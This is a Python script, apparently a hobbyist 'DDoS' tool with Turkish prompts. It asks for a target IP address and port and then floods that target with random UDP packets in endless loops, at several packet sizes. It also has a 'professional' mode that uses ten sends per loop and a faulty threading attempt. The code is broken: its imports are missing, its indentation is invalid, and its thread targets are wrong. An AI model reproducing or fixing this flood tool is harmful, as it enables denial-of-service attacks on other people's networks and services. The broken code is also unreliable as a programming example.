import os
os.system("clear")
print("\033[91m")
os.system("figlet Sexettin DDOS")
print('''
                              ______________                               
                        ,===:'.,            `-._                           
                             `:.`---.__         `-._                       
                               `:.     `--.         `.                     
                                 \.        `.         `.                   
                         (,,(,    \.         `.   ____,-`.,                
                      (,'     `/   \.   ,--.___`.'                         
                  ,  ,'  ,--.  `,   \.;'         `                         
                   `{D, {    \  :    \;                                    
                     V,,'    /  /    //                                    
                     j;;    /  ,' ,-//.    ,---.      ,                    
                     \;'   /  ,' /  _  \  /  _  \   ,'/                    
                           \   `'  / \  `'  / \  `.' /                     
                            `.___,'   `.__,'   `.__,'  
Uyarı! güç arttırıldıkça cihazınız ve modeminiz işlem sırasında daha fazla yavaşlayacaktır
Gücü arttırmanız önerilmez!
Toolda Yaptığınız ve yapacağınız tüm şeylerden siz sorumlusunuz!
Seçenekler:
1500 byte = 1
5000 byte = 2
10000 byte = 3
20000 byte = 4
40000 byte = 5 (ultra mod)
Profesyonel Ddos = 6 (test tam çalışmayabilir veya zararlı olabilir)

	''')
	ddos = input("Seçiminizi Yapınız > ")
	if(ddos=="1"):
		
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))
		bytes = random._urandom(1500)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

	elif(ddos=="2"):
		ddos = input("Seçiminizi Yapınız > ")
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))
		bytes = random._urandom(5000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

	elif(ddos=="3"):
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))
		bytes = random._urandom(10000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

	elif(ddos=="4"):
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))
		bytes = random._urandom(20000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

	elif(ddos=="5"):
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))
		bytes = random._urandom(40000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))

	elif(ddos=="6"):
		hedef_ip = str(input("Hedef ip giriniz > "))
		hedef_port = int(input("Hedef port giriniz > "))
		bytes = random._urandom(25000)
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sayac = 0
		while True:
			dos = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos2 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos3 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos4 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos5 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos6 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos7 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos8 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos9 = sock.sendto(bytes,(hedef_ip, hedef_port))
			dos10 = sock.sendto(bytes,(hedef_ip, hedef_port))
			sayac = sayac+1
			print("Gönderilen paket: %s" %(sayac))
		t1 = threading.Thread(target=dos)
		t2 = threading.Thread(target=dos2)
		t3 = threading.Thread(target=dos3)
		t4 = threading.Thread(target=dos4)
		t5 = threading.Thread(target=dos5)
		t6 = threading.Thread(target=dos6)
		t7 = threading.Thread(target=dos7)
		t8 = threading.Thread(target=dos8)
		t9 = threading.Thread(target=dos9)
		t10 = threading.Thread(target=dos10)
		t1.start()
		t2.start()
		t3.start()
		t4.start()
		t5.start()
		t6.start()
		t7.start()
		t8.start()
		t9.start()
		t10.start()
